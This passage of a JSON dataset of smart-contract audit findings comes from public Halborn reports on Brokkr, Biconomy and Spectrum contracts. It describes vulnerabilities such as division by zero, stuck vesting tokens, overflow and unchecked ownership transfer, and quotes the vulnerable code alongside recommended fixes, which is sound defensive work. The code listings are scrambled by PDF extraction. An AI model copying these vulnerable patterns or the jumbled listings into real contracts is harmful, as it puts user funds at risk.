; 242 243 244 } if let Some ( maximum_user_investment_in_uusd ) =  maximum_user_investment_in_uusd { 245 246 247 248 249 attributes . push ( Attribute :: new ( \" maximum_user_investment_in_uusd_changed \" , maximum_user_investment_in_uusd . to_string () , )); config . maximum_user_investment_in_uusd =  maximum_user_investment_in_uusd ; 250 } Risk Level: Likelihood - 4 Impact - 1 Recommendation: and bounds maximum_cdps_per_user_per_asset, the Upper for lower maximum_user_investment_in_uusd maximum_total_investment_in_uusd and variables should be applied when they are updated during the execution of the update_config function and at instantiation. Remediation plan: RISK ACCEPTED: The Brokkr team claimed that to optimize the size of the code in the contract, the bounds mentioned above will not be introduced. 17 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Delta_Neutral_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING DEDICATED ROLES TO MANAGE CONTRACT STATUS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The delta_neutral contract supports several types of pauses that may Nevertheless, all of occur in the logic of an investment strategy. them can only be invoked by the contract owner, which therefore becomes single-point-of-failure. This problem could be solved by creating a special role that has access only to specific contract functionalities, such as changing the value of is_paused or is_reward_distribution_paused. Code Location: Listing 206,211,236,237,239,280,281,282,283,284,285) 5: lockdrop/src/commands.rs (Lines 202 pub fn update_config ( deps : DepsMut , 203 minimum_investment_in_uusd : Option < Uint128 >, 204 maximum_cdps_per_user_per_asset : Option < u32 >, 205 is_paused : Option < bool >, 206 fee_recipient : Option < String >, 207 fee_pct : Option < DecimalRatio >, 208 maximum_total_investment_in_uusd : Option < Uint128 >, 209 maximum_user_investment_in_uusd : Option < Uint128 >, 210 is_reward_distribution_paused : Option < bool >, 211 212 bro_token_address : Option < String >, 213 ) -> Result < Response , ContractError > { 214 215 216 let mut config = load_config ( deps . storage ) ?; let mut attributes : Vec < Attribute > = vec! [ Attribute :: new (\"  action \" , \" update_config \") ]; 217 218 if let Some ( minimum_investment_in_uusd ) = 18  minimum_investment_in_uusd { 219 220 221 222 223 224 attributes . push ( Attribute :: new ( \" minimum_investment_in_uusd_changed \" , minimum_investment_in_uusd . to_string () , )); config . minimum_investment_in_uusd =  minimum_investment_in_uusd ; 225 226 227 } if let Some ( maximum_cdps_per_user_per_asset ) =  maximum_cdps_per_user_per_asset { 228 229 230 231 232 233 attributes . push ( Attribute :: new ( \" maximum_cdps_per_user_per_asset_changed \" , maximum_cdps_per_user_per_asset . to_string () , )); config . maximum_cdps_per_user_per_asset =  maximum_cdps_per_user_per_asset ; 234 235 236 237 } if let Some ( is_paused ) = is_paused { attributes . push ( Attribute :: new ( \" is_paused_changed \" ,  is_paused . to_string () )) ; 238 239 240 241 242 243 244 245 246 247 248 config . is_paused = is_paused ; } if let Some ( fee_recipient ) = fee_recipient { attributes . push ( Attribute :: new ( \" fee_recipient_changed \" , fee_recipient . to_string () , )); config . fee_recipient = deps . api . addr_validate (&  fee_recipient ) ?; 249 250 251 252 253 } if let Some ( fee_pct ) = fee_pct { if fee_pct . denominator == 0  denominator ) 254 255 { || WDecimal :: from_ratio ( fee_pct . numerator , fee_pct . > WDecimal :: from_ratio (100 u128 , 1 u128 ) 19 256 257 258 259 return Err ( ContractError :: InvalidFeeError {}) ; } attributes . push ( Attribute :: new ( \" fee_pct_changed \" , fee_pct .  to_string () )); 260 261 config . fee_pct = WDecimal :: from_ratio ( fee_pct . numerator ,  fee_pct . denominator ); 262 263 264 } if let Some ( maximum_total_investment_in_uusd ) =  maximum_total_investment_in_uusd { 265 266 267 268 269 attributes . push ( Attribute :: new ( \" maximum_total_investment_in_uusd_changed \" , maximum_total_investment_in_uusd . to_string () , )); config . maximum_total_investment_in_uusd =  maximum_total_investment_in_uusd ; 270 271 272 } if let Some ( maximum_user_investment_in_uusd ) =  maximum_user_investment_in_uusd { 273 274 275 276 277 attributes . push ( Attribute :: new ( \" maximum_user_investment_in_uusd_changed \" , maximum_user_investment_in_uusd . to_string () , )); config . maximum_user_investment_in_uusd =  maximum_user_investment_in_uusd ; 278 279 280 } if let Some ( is_reward_distribution_paused ) =  is_reward_distribution_paused { 281 282 283 284 285 attributes . push ( Attribute :: new ( \" is_reward_distribution_paused_changed \" , is_reward_distribution_paused . to_string () , )); config . is_reward_distribution_paused =  is_reward_distribution_paused ; 286 287 288 289 290 291 } if let Some ( bro_token_address ) = bro_token_address { attributes . push ( Attribute :: new ( \" bro_token_address_changed \" , bro_token_address . to_string () , 20 292 293 294 )); config . bro_token_address = deps . api . addr_validate (&  bro_token_address ) ?; 295 296 297 298 299 } } store_config ( deps . storage , & config ) ?; Ok ( Response :: new () . add_attributes ( attributes )) Risk Level: Likelihood - 1 Impact - 2 Recommendation: We suggest exploring the possibility of introducing an additional role responsible for contract management and potential pauses in its logic, for example Pauser. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 21 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Delta_Neutral_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED CONFIG VARIABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The instantiate function implements the is_test_contract variable, which is not used anywhere in the contract. It is a good practice to eliminate the so-called dead code, which in no way affects the logic of the program being executed. Code Location: Listing 6: lockdrop/src/contract.rs (Line 55) minimum_investment_in_uusd : msg . minimum_investment_in_uusd maximum_cdps_per_user_per_asset : msg . owner : deps . api . addr_canonicalize (& msg . owner )? , is_test_contract : msg . is_test_contract , is_paused : msg . is_paused , fee_recipient : deps . api . addr_validate (& msg . fee_recipient ) fee_pct : Decimal :: from_ratio ( msg . fee_pct . numerator , msg . 51 let config = Config { 52  , 53  maximum_cdps_per_user_per_asset , 54 55 56 57  ?, 58  fee_pct . denominator ) , 59  maximum_total_investment_in_uusd , 60  maximum_user_investment_in_uusd , 61  is_reward_distribution_paused , 62  aust_token_address )?, 63  mir_token_address )? , 64  bro_token_address )? , 65 maximum_total_investment_in_uusd : msg . maximum_user_investment_in_uusd : msg . is_reward_distribution_paused : msg . aust_token_address : deps . api . addr_validate (& msg . mir_token_address : deps . api . addr_validate (& msg . bro_token_address : deps . api . addr_validate (& msg . ts_factory_contract_address : deps . api . addr_validate (& msg . 22  ts_factory_contract_address )? , 66  a_market_contract_address )? , 67  mirr_mint_contract_address )? , 68  mirr_lock_contract_address )? , 69 a_market_contract_address : deps . api . addr_validate (& msg . mirr_mint_contract_address : deps . api . addr_validate (& msg . mirr_lock_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address : deps Risk Level: Likelihood - 2 Impact - 1 Recommendation: Unused is_test_contract variable should be removed. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 23 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Delta_Neutral_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO CONVENTION IN VARIABLE TYPES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the analysis of the contract code, it was noticed that in many places the variables storing addresses are assigned the CanonicalAddr type; however, there are still single cases of using the standard Addr type. Considering the fact that the contract is largely adapted to support canonical addresses, it is a good practice to keep the convention, which will increase the readability of the code and make the impact of potential future changes to a smaller number of types. Code Location: Listing 7: Samples usage of standard Addr types: 1 packages / services / src / delta_neutral . rs : #261 , 262 , 299 , 302 2 contracts / delta_neutral / src / state . rs : #254 , 262 , 286 , 294 Risk Level: Likelihood - 1 Impact - 1 Recommendation: To keep the convention, we suggest that you consider adapting the contract to handle one type of variable holding addresses. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 24 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Delta_Neutral_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNMANTAINED DEPENDENCY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Halborn used automated security scanners to assist with detection of well-known security issues and vulnerabilities. Among the tools used was cargo audit, a security scanner for vulnerabilities reported to the RustSec Advisory Database. All vulnerabilities published in https:// crates.io are stored in a repository named The RustSec Advisory Database. cargo audit is a human-readable version of the advisory database which performs a scanning on Cargo.lock. Security Detections are only in scope. To better assist the developers maintaining this code, the auditors are including the output with the dependencies tree, and this is included in the cargo audit output to better know the dependencies affected by unmaintained and vulnerable crates. ID RUSTSEC-2020-0025 package bigint Short Description biginit is unmaintained, use uint instead Code Location: Listing 8: Dependency tree 1 bigint 4.4.3 2 3 4 cosmwasm - bignumber 2.2.0 moneymarket 0.3.0 brotocol - delta - neutral 1.0.0 Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: Beware of using dependencies and packages that are no longer supported by the developers or have publicly known security flaws, even when not exploitable at the moment. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 26 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Delta_Neutral_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "INVALID CHECK ON CREATECLAIM METHOD LEADS TO UNCLAIM OF TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The createClaim method on the contract which ables to create claim for beneficiary users is vulnerable to division by zero vulnerability due to invalid check. This method takes several arguments such as _beneficiary, _vestAmount, _unlockAmount, _unlockTime, _startTime and _endTime. Also, this method has several require controls itself. The following require check makes it possible to enter 0 as the _endTime variable if _startTime variable equals to 0. Listing 1: BicoVestingFlat.sol 1 require ( _endTime >= _startTime , \" INVALID_TIME \" ); Setting 0 as both _startTime and _endTime variables will work properly. However, the claimableAmount method will not work since division by zero occur due to _endTime variable equals to 0. Therefore, it will not be possible to claim tokens for beneficiary. As a result, tokens will be stuck on the contract even claims[beneficiary].isActive equals to true. Code Location: Listing 2: BicoVestingFlat.sol (Lines 1156) 1147 function createClaim ( 1148 1149 1150 1151 1152 address _beneficiary , uint256 _vestAmount , uint256 _unlockAmount , uint256 _unlockTime , uint64 _startTime , 14 1153 1154 1155 1156 1157 1158 1159 1160 1161 1162 1163 1164 1165 1166 1167 1168 1169 1170 1171 1172 1173 1174 1175 1176 1177 1178 1179 1180 1181 1182 1183 1184 1185 1186 1187 1188 1189 1190 1191 1192 1193 uint64 _endTime ) public onlyAdmin { require (! claims [ _beneficiary ]. isActive , \" CLAIM_ACTIVE \" ); require ( _endTime >= _startTime , \" INVALID_TIME \" ); require ( _beneficiary != address (0) , \" INVALID_ADDRESS \"); require ( _vestAmount > 0, \" INVALID_AMOUNT \" ); // review // should probably use IERC20 interface instead of ERC20 import ? // need for safe transfer ? // notice // Admin needs to give prior apporve tokens to this contract require ( ERC20 ( tokenAddress ). allowance ( msg . sender , address ( this )) >= ( _vestAmount . add ( _unlockAmount )) , \" INVALID_ALLOWANCE \" ); ERC20 ( tokenAddress ). transferFrom ( msg . sender , address ( this ) , _vestAmount ); Claim memory newClaim = Claim ({ isActive : true , vestAmount : _vestAmount , unlockAmount : _unlockAmount , unlockTime : _unlockTime , startTime : _startTime , endTime : _endTime , amountClaimed : 0 }) ; claims [ _beneficiary ] = newClaim ; emit ClaimCreated ( msg . sender , _beneficiary , _vestAmount , _unlockAmount , _unlockTime , _startTime , _endTime ); 15 1194 } Listing 3: BicoVestingFlat.sol (Lines 1255,1256) 1254 { 1255 1256 1257 1258 1259 1260 1261 1262 } claimPercent = currentTimestamp . sub ( _claim . startTime ). mul (1 e18 ). div ( _claim . endTime . sub ( _claim . startTime ) ); claimAmount = _claim . vestAmount . mul ( claimPercent ). div (1 e18 ). add ( _claim . unlockAmount ); unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); Risk Level: Likelihood - 4 Impact - 4 Recommendations: It is recommended to replace the require check above with the following one. Also, it is possible to mitigate this issue by implementing zero check for _endTime variable. Listing 4: Possible Fix 1 require ( _endTime > _startTime , \" INVALID_TIME \" ); Listing 5: Possible Fix-2 1 require ( _endTime != 0 , \" INVALID_TIME_FOR_ENDTIME \" ); 16 Remediation Plan: SOLVED: The Biconomy Team solved this issue by implementing the recom- mendation above. It has become impossible to set 0 as _endTime variable with this mitigation. As a result, division by zero will not occur in the future. Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 17 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: High"
        ]
    },
    {
        "title": "CLAIMING TOKENS BEFORE UNLOCKTIME LEADS UNCLAIM OF LOCKED TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The createClaim method on the contract which can to create claim for beneficiary users is vulnerable to unclaimed tokens. If any user tries to claim their rewards before reaching to _unlockTimes timestamp variable, the isActive field changes to false. The contract does not have any Therefore, method to convert the isActive field to true from false. users will not be able to get their unlocked amounts as rewards if they try to claim awards before their _unlockTime. For example, the contract admin creates a claim with following variables: Listing 6: Create Claim Example 1 _beneficiary = \"0 x ...... \" , 2 _vestAmount = \" 1 Test Token \" , 3 _unlockAmount = \" 200 Test Token \" , 4 _unlockTime = current_timestamp + 1 day , 5 _startTime = 0, 6 _endTime = current_timestamp + 1 minute If user tries to claim awards after current_timestamp + 1 day, that user will get only 201 Test Tokens. However, if the user tries to claim awards before _unlockTime, user will get only 1 Test Token, the isActive field will be set to false by contract and it will not be possible to change it to true even timestamp reaches to _unlockTime. As a result, 200 Test Tokens will be stuck on the contract. 18 Code Location: Listing 7: BicoVestingFlat.sol (Lines 1285) 1278 function claim () external whenNotPaused nonReentrant { address beneficiary = msg . sender ; 1279 Claim memory _claim = claims [ beneficiary ]; 1280 require ( _claim . isActive , \" CLAIM_INACTIVE \" ); 1281 uint256 unclaimedAmount = claimableAmount ( beneficiary ); 1282 ERC20 ( tokenAddress ). transfer ( beneficiary , unclaimedAmount ) 1283 ; _claim . amountClaimed = _claim . amountClaimed + unclaimedAmount ; if ( _claim . amountClaimed == _claim . vestAmount ) _claim . isActive = false ; claims [ beneficiary ] = _claim ; emit Claimed ( beneficiary , unclaimedAmount ); 1284 1285 1286 1287 1288 } Risk Level: Likelihood - 4 Impact - 4 Recommendations: It is recommended to implement another check to validate the following formula. Listing 8: Formula 1 _unlockTime < _startTime < _endTime 19 Remediation Plan: SOLVED: The Biconomy Team solved this issue by implementing the formula above. All time variables will be controlled sequentially. Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 20 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: High"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "If youre using an unsigned integer in Solidity, the possible values of your variable ranges from 0 to 2 ^ 256. So, it means that if you are around the max value and increment your variable, it will go back to 0. The same happens if your variable is at 0, and you subtract one, instead of overflow it is called underflow. The SafeMath library also protects contracts for possible integer over- flows or underflows. Even this control mechanism exists on the contract, BicoVestingFlat.sol contract is vulnerable to the integer overflow vulnerability due to missing use of add() method. Code Location: Listing 9: BicoVestingFlat.sol (Lines 1284) 1284 _claim . amountClaimed = _claim . amountClaimed + unclaimedAmount ; Risk Level: Likelihood - 3 Impact - 3 21 Recommendations: It is recommended to use SafeMath add() method instead of plus (+) oper- ator. Listing 10: BicoVestingFlat.sol 1284 _claim . amountClaimed = _claim . amountClaimed . add ( unclaimedAmount ); Remediation Plan: SOLVED: plus (+)operator. This issue was removed by replacing the .add() function with Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 22 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization of permissions on a token. All the features of the smart contract, such as mint/burn tokens and pause contracts, are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process user, or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. There are multiple important functionalities on BicoVestingFlat.sol contract such as creating claims for beneficiaries, setting new Admin for the contract and pausing/unpausing the contract. It is important to divide these functionalities into multiple roles. Code Location: Listing 11: Centralized Functions 1 function pause () 2 function unpause () 3 function createClaim ( address _beneficiary , uint256 _vestAmount , uint256 _unlockAmount , uint256 _unlockTime , uint64 _startTime , uint64 _endTime ) 4 function createBatchClaim ( address [] memory _beneficiaries , uint256 [] memory _vestAmounts , uint256 [] memory _unlockAmounts , uint256 [] memory _unlockTimes , uint64 [] memory _startTimes , uint64 [] memory _endTimes ) 5 function setAdmin ( address admin , bool enabled ) 23 Risk Level: Likelihood - 3 Impact - 1 Recommendations: RESOURCE_SETTER, PAUSER roles and onlyResourceSetter, onlyPauser modi- fiers should be implemented for the following functions to avoid cen- tralization of the contract. Listing 12: Centralized Functions 1 function pause () onlyPauser 2 function unpause () onlyPauser 3 function createClaim ( address _beneficiary , uint256 _vestAmount , uint256 _unlockAmount , uint256 _unlockTime , uint64 _startTime , uint64 _endTime ) onlyResourceSetter 4 function createBatchClaim ( address [] memory _beneficiaries , uint256 [] memory _vestAmounts , uint256 [] memory _unlockAmounts , uint256 [] memory _unlockTimes , uint64 [] memory _startTimes , uint64 [] memory _endTimes ) onlyResourceSetter Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 24 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Owner of the contract is usually the account which deploys the con- As a result, the Owner can perform some privileged functions tract. In BicoVestingFlat.sol smart contract, the like transferOwnership(). renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Code Location: Listing 13: BicoVestingFlat.sol 1114 contract BicoVesting is AccessProtected , Pausable , ReentrancyGuard { 1115 . . . 1116 } Risk Level: Likelihood - 3 Impact - 1 Recommendations: It is recommended to prevent the current owner from calling the renounceOwnership method before transferring the Ownership to another address. In addition, if a multi-signature wallet is used, calling the renounceOwnership method should be confirmed for two or more users. 25 Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 26 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The BicoVestingFlat.sol contract have multiple input fields on their both public and private functions. Some of these inputs are required as address variable. During the test, it has seen some of these inputs are not protected against using the address(0) as the target address. It is not recommended to use zero address as target addresses on the contracts. Code Location: Listing 14: BicoVestingFlat.sol (Lines 1077) 1076 function setAdmin ( address admin , bool enabled ) external onlyOwner 1077 1078 1079 { } _admins [ admin ] = enabled ; emit AdminAccessSet ( admin , enabled ); Listing 15: BicoVestingFlat.sol (Lines 1144) 1143 constructor ( address _tokenAddress ) { 1144 1145 tokenAddress = _tokenAddress ; } Risk Level: Likelihood - 2 Impact - 2 27 Recommendations: It is recommended to implement additional address check to detect is current contract getting used as a target address. Listing 16: BicoVestingFlat.sol 1076 function setAdmin ( address admin , bool enabled ) external onlyOwner 1077 1078 1079 1080 { } require ( admin != address (0) , \" Address can not be zero . \" ); _admins [ admin ] = enabled ; emit AdminAccessSet ( admin , enabled ); Listing 17: BicoVestingFlat.sol 1143 constructor ( address _tokenAddress ) { 1144 require ( _tokenAddress != address (0) , \" Address can not be zero . \"); tokenAddress = _tokenAddress ; 1145 1146 } Remediation Plan: SOLVED: the contract code. This issue was removed by implementing zero address checks to Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 28 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF OWNERSHIP FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some ownership functions on the contract come directly from the included libraries. These functions are listed in the Code Location section. These functions are thought to have been included mistakenly. Code Location: Listing 18: Misused Functions 1 function renounceOwnership () 2 function transferOwnership ( address newOwner ) Risk Level: Likelihood - 2 Impact - 2 Recommendations: It is recommended to override and disable these functions. Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 29 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ISACTIVE CONTROL ON REVOKE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There is a revoke method that is used to invalidate claims created specifically for beneficiary addresses on the contract. A check over this method has been found to be missing. As a result, the function can be executed again even if the claim is invalidated. This may adversely affect the use of gas. Code Location: Listing 19: BicoVestingFlat.sol (Lines 1291) 1290 function revoke ( address beneficiary ) external onlyAdmin { claims [ beneficiary ]. isActive = false ; 1291 emit Revoked ( beneficiary ); 1292 1293 } Risk Level: Likelihood - 2 Impact - 2 30 Recommendations: It is suggested to implement following control to revoke method. Listing 20: BicoVestingFlat.sol (Lines 1291) 1290 function revoke ( address beneficiary ) external onlyAdmin { 1291 require ( claims [ beneficiary ] != false , \" Already invalidated . \" ); claims [ beneficiary ]. isActive = false ; emit Revoked ( beneficiary ); 1292 1293 1294 } Remediation Plan: SOLVED: The Biconomy Team solved this issue by adding additional require check to the contract code. Commit ID: f1ad27ca200d00adb1568b9d6a16bc10dda555e3 31 ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During a manual review, the use of block.timestamp has identified. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. It is also known that these block.timestamp values only used on events. However, if a malicious miner exploits any vulnerability on the contract, this miner can confuse incident response teams by manipulating these events. Code Location: Listing 1241,1242,1245,1247,1252,1253,1263,1264) 21: BicoVestingFlat.sol (Lines { public view returns ( uint256 ) 1234 function claimableAmount ( address beneficiary ) 1235 1236 1237 1238 1239 1240 1241 1242 1243 1244 1245 block . timestamp < _claim . startTime && block . timestamp < _claim . unlockTime Claim memory _claim = claims [ beneficiary ]; if ( ) return 0; if ( _claim . amountClaimed == _claim . vestAmount ) return 0; uint256 currentTimestamp = block . timestamp > _claim . 1246 1247 1248 1249 1250 1251 endTime ? _claim . endTime : block . timestamp ; uint256 claimPercent ; uint256 claimAmount ; uint256 unclaimedAmount ; if ( 32 1252 1253 1254 1255 1256 1257 1258 1259 1260 1261 1262 1263 1264 1265 1266 1267 1268 1269 1270 1271 1272 1273 1274 1275 1276 _claim . unlockTime <= block . timestamp && _claim . startTime <= block . timestamp ) { claimPercent = currentTimestamp . sub ( _claim . startTime ). mul (1 e18 ). div ( _claim . endTime . sub ( _claim . startTime ) ); claimAmount = _claim . vestAmount . mul ( claimPercent ). div (1 e18 ). add ( _claim . unlockAmount ); unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); } else if ( _claim . unlockTime > block . timestamp && _claim . startTime <= block . timestamp ) { claimPercent = currentTimestamp . sub ( _claim . startTime ). mul (1 e18 ). div ( _claim . endTime . sub ( _claim . startTime ) ); claimAmount = _claim . vestAmount . mul ( claimPercent ). div (1 e18 ); unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); } else { claimAmount = _claim . unlockAmount ; unclaimedAmount = claimAmount . sub ( _claim . amountClaimed ); } return unclaimedAmount ; } Risk Level: Likelihood - 2 Impact - 2 33 Recommendations: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the project occurs across years, days, and months rather than seconds. References: Block Values as a Proxy for Time Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 34 3.10 (HAL-10) IGNORED RETURN VALUES - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Biconomy_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESSES CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "An incorrect use of the update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  spectrum_anchor_farm  spectrum_gov  spectrum_mirror_farm  spectrum_platform  spectrum_pylon_farm  spectrum_spec_farm  spectrum_wallet Code Location: Listing 1: contracts/spectrum_anchor_farm/src/contract.rs 170 171 172 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 2: contracts/spectrum_gov/src/contract.rs 199 200 201 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } 15 Listing 3: contracts/spectrum_mirror_farm/src/contract.rs 174 175 176 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 4: contracts/spectrum_platform/src/contract.rs 119 120 121 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 5: contracts/spectrum_pylon_farm/src/contract.rs 170 171 172 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 6: contracts/spectrum_spec_farm/src/contract.rs 144 145 146 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Listing 7: contracts/spectrum_wallet/src/contract.rs 369 370 371 if let Some ( owner ) = owner { config . owner = deps . api . canonical_address (& owner ) ?; } Risk Level: Likelihood - 3 Impact - 3 16 Recommendation: It is recommended to split ownership transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by recipient. Remediation plan: SOLVED: Issue fixed in commit 6010909e58197a23c4e194e296250b569e9f0564. Contracts owner cannot be updated once Gov contract is set as owner. 17 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "NOT ENFORCING SLIPPAGE TOLERANCE COULD LEAD TOKENS LOSS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "The bond function from contracts/spectrum_staker/src/contract.rs does not enforce slippage_tolerance parameter when users provide liquidity to spectrum_staker contract. As a consequence, if a user mistakenly (or fooled by an attacker) provides liquidity with an imbalanced asset pair, he could lose all his excedent tokens. Example: A user provides liquidity of 0.999258 UST and 0.006815 mAAPL for spectrum_staker contract, he receives 0.079814 mAAPL-UST LP. 18 On the other hand, if the user provides liquidity of 0.999258 UST and 0.681536 mAAPL for spectrum_staker contract, he also receives 0.079814 mAAPL-UST LP, the same amount of LP tokens than previous transaction, but spending 100 times more mAAPL tokens. Code Location: Listing 8: contracts/spectrum_staker/src/contract.rs (Lines 69) 64 65 66 67 68 69 70 71 fn bond < S: Storage , A : Api , Q: Querier >( deps : & mut Extern <S , A , Q >, env : Env , contract : HumanAddr , assets : [ Asset ; 2] , slippage_tolerance : Option < Decimal >, compound_rate : Option < Decimal >, ) -> StdResult < HandleResponse > { 19 Listing 9: contracts/spectrum_staker/src/contract.rs (Lines 149) 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 CosmosMsg :: Wasm ( WasmMsg :: Execute { contract_addr : terraswap_pair . contract_addr , msg : to_binary (& PairHandleMsg :: ProvideLiquidity { assets : if let AssetInfo :: NativeToken { .. } = assets [0]. info . clone () { [ native_asset . clone () , assets [1]. clone () ] } else { [ assets [0]. clone () , native_asset . clone () ] }, slippage_tolerance , }) ?, send : vec! [ Coin { denom : native_asset . info . to_string () , amount : native_asset . amount , }] , }) , Risk Level: Likelihood - 1 Impact - 4 Recommendation: Enforce 